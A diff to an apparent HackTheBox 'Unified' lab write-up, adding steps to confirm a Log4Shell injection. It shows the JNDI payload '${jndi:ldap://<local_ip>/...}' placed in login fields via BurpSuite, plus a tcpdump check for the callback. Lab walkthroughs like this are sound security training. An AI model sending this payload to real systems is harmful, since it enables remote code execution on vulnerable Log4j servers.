@@ -109,7 +109,11 @@ Change the payload of <code>password</code> to <code>${jndi:ldap://&lt;local_ip&
 Replace the payload of <code>remember</code> with <code>${jndi:ldap://&lt;local_ip&gt;/&lt;random_input&gt;}</code> and send it,<br>
 in the response on the right, you will see msg：<code>api.err.Invalid<b>Payload</b></code>.<br>
 Despite an invalid message is displayed, in fact, the payload is still being executed behind the scenes.<br>
-<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/Repeater2.png" alt="Repeater2" width="60%">
+<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/Repeater2.png" alt="Repeater2" width="60%"><br>
+Double authentication can be done by using <code>tcpdump</code>.<br>
+Open a window and enter <code>tcpdump -i tun0</code> command before Send Request in BurpSuite.<br>
+The result is shown in the picture below, there will be a bunch of information,<br>
+indicating that the JNDI command was successfully executed and connected to our local machine.<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/tcpdump.png" alt="tcpdump" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/tcpdump2.png" alt="tcpdump2" width="60%">
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Unified/Unified/tcpdump3.png" alt="tcpdump3" width="60%">
